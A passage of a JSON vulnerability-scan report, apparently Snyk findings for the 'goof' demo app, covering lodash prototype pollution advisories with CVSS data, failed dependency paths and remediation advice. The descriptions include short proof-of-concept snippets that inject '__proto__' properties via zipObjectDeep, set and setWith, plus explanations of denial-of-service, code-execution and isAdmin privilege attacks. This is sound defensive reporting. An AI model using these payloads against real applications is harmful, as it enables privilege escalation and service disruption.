Security Advisory](https://www.npmjs.com/advisories/1065)\\n- [Snyk Blog](https://snyk.io/blog/snyk-research-team-discovers-severe-prototype-pollution-security-vulnerabilities-affecting-all-versions-of-lodash/)\\n\",\n  \"disclosureTime\": \"2019-06-19T11:45:02Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"4.17.12\"\n  ],\n  \"functions\": [\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"lodash.js\",\n        \"functionName\": \"runInContext.customDefaultsMerge\"\n      },\n      \"version\": [\n        \">=4.17.3 <4.17.12\"\n      ]\n    }\n  ],\n  \"functions_new\": [\n    {\n      \"functionId\": {\n        \"filePath\": \"lodash.js\",\n        \"functionName\": \"runInContext.customDefaultsMerge\"\n      },\n      \"version\": [\n        \">=4.17.3 <4.17.12\"\n      ]\n    }\n  ],\n  \"id\": \"SNYK-JS-LODASH-450202\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2019-10744\"\n    ],\n    \"CWE\": [\n      \"CWE-400\"\n    ],\n    \"GHSA\": [\n      \"GHSA-jf85-cpcp-j695\"\n    ],\n    \"NSP\": [\n      \"1065\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2022-04-05T12:25:20.940478Z\",\n  \"moduleName\": \"lodash\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"lodash\",\n  \"patches\": [\n    {\n      \"comments\": [],\n      \"id\": \"patch:SNYK-JS-LODASH-450202:0\",\n      \"modificationTime\": \"2019-12-03T11:40:45.719849Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/lodash/20190702/lodash_20190702_0_0_1f8ea07746963a535385a5befc19fa687a627d2b.patch\"\n      ],\n      \"version\": \"=4.17.11\"\n    }\n  ],\n  \"proprietary\": true,\n  \"publicationTime\": \"2019-07-02T11:45:01Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Issue\",\n      \"url\": \"https://github.com/lodash/lodash/issues/4348\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/lodash/lodash/pull/4336\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/lodash/lodash/pull/4355\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/sailshq/lodash/pull/1\"\n    },\n    {\n      \"title\": \"Node Security Advisory\",\n      \"url\": \"https://www.npmjs.com/advisories/1065\"\n    },\n    {\n      \"title\": \"Snyk Blog\",\n      \"url\": \"https://snyk.io/blog/snyk-research-team-discovers-severe-prototype-pollution-security-vulnerabilities-affecting-all-versions-of-lodash/\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<4.17.12\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Prototype Pollution\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"lodash@4.17.4\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"lodash@4.17.12\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"lodash\",\n  \"version\": \"4.17.4\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , lodash@4.17.4 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-generator@6.26.1 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-traverse@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-template@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-generator@6.26.1 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-traverse@6.26.0 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-template@6.26.0 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-template@6.26.0 , babel-traverse@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-template@6.26.0 , babel-traverse@6.26.0 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [
              "2020-8203"
            ],
            "ghsaid": [
              "p6mc-m468-83gw"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Prototype Pollution",
          "id": "SNYK-JS-LODASH-567746",
          "desc": "## Overview\n[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.\n\nAffected versions of this package are vulnerable to Prototype Pollution. The function `zipObjectDeep` can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.\r\n\r\n## PoC\r\n```\r\nconst _ = require('lodash');\r\n_.zipObjectDeep(['__proto__.z'],[123])\r\nconsole.log(z) // 123\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `lodash` to version 4.17.20 or higher.\n## References\n- [GitHub Commit](https://github.com/lodash/lodash/commit/c84fe82760fb2d3e03a63379b297a1cc1a2fce12)\n- [GitHub PR](https://github.com/lodash/lodash/pull/4759)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H/E:P/RL:U/RC:C\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2020-04-28T14:32:13.683154Z\",\n  \"credit\": [\n    \"posix\"\n  ],\n  \"cvssScore\": 8.2,\n  \"description\": \"## Overview\\n[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.\\n\\nAffected versions of this package are vulnerable to Prototype Pollution. The function `zipObjectDeep` can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.\\r\\n\\r\\n## PoC\\r\\n```\\r\\nconst _ = require('lodash');\\r\\n_.zipObjectDeep(['__proto__.z'],[123])\\r\\nconsole.log(z) // 123\\r\\n```\\n\\n## Details\\n\\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\\n\\nThere are two main ways in which the pollution of prototypes occurs:\\n\\n-   Unsafe `Object` recursive merge\\n    \\n-   Property definition by path\\n    \\n\\n### Unsafe Object recursive merge\\n\\nThe logic of a vulnerable recursive merge function follows the following high-level model:\\n```\\nmerge (target, source)\\n\\n  foreach property of source\\n\\n    if property exists and is an object on both the target and the source\\n\\n      merge(target[property], source[property])\\n\\n    else\\n\\n      target[property] = source[property]\\n```\\n<br>  \\n\\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\\n\\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\\n\\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\\n\\n### Property definition by path\\n\\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\\n\\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\\n\\n## Types of attacks\\n\\nThere are a few methods by which Prototype Pollution can be manipulated:\\n\\n| Type |Origin  |Short description |\\n|--|--|--|\\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\\n\\n## Affected environments\\n\\nThe following environments are susceptible to a Prototype Pollution attack:\\n\\n-   Application server\\n    \\n-   Web server\\n    \\n\\n## How to prevent\\n\\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\\n    \\n2.  Require schema validation of JSON input.\\n    \\n3.  Avoid using unsafe recursive merge functions.\\n    \\n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\\n    \\n5.  As a best practice use `Map` instead of `Object`.\\n\\n### For more information on this vulnerability type:\\n\\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\\n\\n## Remediation\\nUpgrade `lodash` to version 4.17.20 or higher.\\n## References\\n- [GitHub Commit](https://github.com/lodash/lodash/commit/c84fe82760fb2d3e03a63379b297a1cc1a2fce12)\\n- [GitHub PR](https://github.com/lodash/lodash/pull/4759)\\n\",\n  \"disclosureTime\": \"2020-04-27T22:14:18Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"4.17.20\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-LODASH-567746\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2020-8203\"\n    ],\n    \"CWE\": [\n      \"CWE-400\"\n    ],\n    \"GHSA\": [\n      \"GHSA-p6mc-m468-83gw\"\n    ],\n    \"NSP\": [\n      \"1523\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2022-04-05T12:28:33.431814Z\",\n  \"moduleName\": \"lodash\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"lodash\",\n  \"patches\": [\n    {\n      \"comments\": [],\n      \"id\": \"patch:SNYK-JS-LODASH-567746:0\",\n      \"modificationTime\": \"2020-04-30T14:28:46.729327Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/lodash/20200430/lodash_0_0_20200430_6baae67d501e4c45021280876d42efe351e77551.patch\"\n      ],\n      \"version\": \">=4.14.2\"\n    }\n  ],\n  \"proprietary\": false,\n  \"publicationTime\": \"2020-04-28T14:59:14Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/lodash/lodash/commit/c84fe82760fb2d3e03a63379b297a1cc1a2fce12\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/lodash/lodash/pull/4759\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<4.17.20\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Prototype Pollution\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"lodash@4.17.4\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"lodash@4.17.20\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": true,\n  \"name\": \"lodash\",\n  \"version\": \"4.17.4\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , lodash@4.17.4 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-generator@6.26.1 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-traverse@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-template@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-generator@6.26.1 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-traverse@6.26.0 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-template@6.26.0 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-template@6.26.0 , babel-traverse@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-template@6.26.0 , babel-traverse@6.26.0 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Prototype Pollution",
          "id": "SNYK-JS-LODASH-608086",
          "desc": "## Overview\n[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.\n\nAffected versions of this package are vulnerable to Prototype Pollution via the `setWith` and `set` functions.\r\n\r\n### PoC by awarau\r\n* Create a JS file with this contents:\r\n```\r\nlod = require('lodash')\r\nlod.setWith({}, \"__proto__[test]\", \"123\")\r\nlod.set({}, \"__proto__[test2]\", \"456\")\r\nconsole.log(Object.prototype)\r\n```\r\n* Execute it with `node`\r\n* Observe that `test` and `test2` is now in the `Object.prototype`.\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `lodash` to version 4.17.17 or higher.\n## References\n- [HackerOne Report](https://hackerone.com/reports/864701)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2020-08-21T12:52:58.443440Z\",\n  \"credit\": [\n    \"awarau\"\n  ],\n  \"cvssScore\": 7.3,\n  \"description\": \"## Overview\\n[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.\\n\\nAffected versions of this package are vulnerable to Prototype Pollution via the `setWith` and `set` functions.\\r\\n\\r\\n### PoC by awarau\\r\\n* Create a JS file with this contents:\\r\\n```\\r\\nlod = require('lodash')\\r\\nlod.setWith({}, \\\"__proto__[test]\\\", \\\"123\\\")\\r\\nlod.set({}, \\\"__proto__[test2]\\\", \\\"456\\\")\\r\\nconsole.log(Object.prototype)\\r\\n```\\r\\n* Execute it with `node`\\r\\n* Observe that `test` and `test2` is now in the `Object.prototype`.\\n\\n## Details\\n\\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\\n\\nThere are two main ways in which the pollution of prototypes occurs:\\n\\n-   Unsafe `Object` recursive merge\\n    \\n-   Property definition by path\\n    \\n\\n### Unsafe Object recursive merge\\n\\nThe logic of a vulnerable recursive merge function follows the following high-level model:\\n```\\nmerge (target, source)\\n\\n  foreach property of source\\n\\n    if property exists and is an object on both the target and the source\\n\\n      merge(target[property], source[property])\\n\\n    else\\n\\n      target[property] = source[property]\\n```\\n<br>  \\n\\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\\n\\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\\n\\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\\n\\n### Property definition by path\\n\\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\\n\\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\\n\\n## Types of attacks\\n\\nThere are a few methods by which Prototype Pollution can be manipulated:\\n\\n| Type |Origin  |Short description |\\n|--|--|--|\\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\\n\\n## Affected environments\\n\\nThe following environments are susceptible to a Prototype Pollution attack:\\n\\n-   Application server\\n    \\n-   Web server\\n    \\n\\n## How to prevent\\n\\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\\n    \\n2.  Require schema validation of JSON input.\\n    \\n3.  Avoid using unsafe recursive merge functions.\\n    \\n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\\n    \\n5.  As a best practice use `Map` instead of `Object`.\\n\\n### For more information on this vulnerability type:\\n\\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\\n\\n## Remediation\\nUpgrade `lodash` to version 4.17.17 or higher.\\n## References\\n- [HackerOne Report](https://hackerone.com/reports/864701)\\n\",\n  \"disclosureTime\": \"2020-08-21T10:34:29Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"4.17.17\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-LODASH-608086\",\n  \"identifiers\": {\n    \"CVE\": [],\n    \"CWE\": [\n      \"CWE-400\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2022-04-05T12:28:03.402499Z\",\n  \"moduleName\": \"lodash\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"lodash\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2020-08-21T12:53:03Z\",\n  \"references\": [\n    {\n      \"title\": \"HackerOne Report\",\n      \"url\": \"https://hackerone.com/reports/864701\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<4.17.17\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Prototype Pollution\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"lodash@4.17.4\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"lodash@4.17.17\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"lodash\",\n  \"version\": \"4.17.4\"\n}",
          "results": [
            {
              "status": "failed",
